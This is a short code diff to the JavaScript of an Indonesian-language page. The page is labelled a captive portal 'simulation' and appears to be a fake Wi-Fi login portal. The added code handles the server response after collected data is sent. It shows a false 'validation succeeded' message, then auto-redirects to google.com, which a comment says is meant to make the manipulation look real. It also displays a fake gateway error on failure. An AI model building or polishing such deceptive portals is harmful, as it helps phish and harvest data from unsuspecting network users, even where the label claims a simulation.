@@ -104,10 +104,23 @@
                         timestamp: new Date().toISOString(),
                         tipe_akses: "Simulasi_Captive_Portal_Akurat"
                     })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        status.style.color = "green";
+                        status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
+                        // Pengalihan otomatis (redirect) agar manipulasi terlihat nyata
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com";
+                        }, 2000);
+                    } else {
+                        throw new Error("Gagal mengirim data.");
+                    }
+                })
+                .catch(error => {
+                    status.style.color = "red";
+                    status.innerHTML = "Eror: Jaringan terputus saat menghubungi gateway.";
                 });
-                
-                status.style.color = "green";
-                status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
             },
             (error) => {
                 status.style.color = "red";
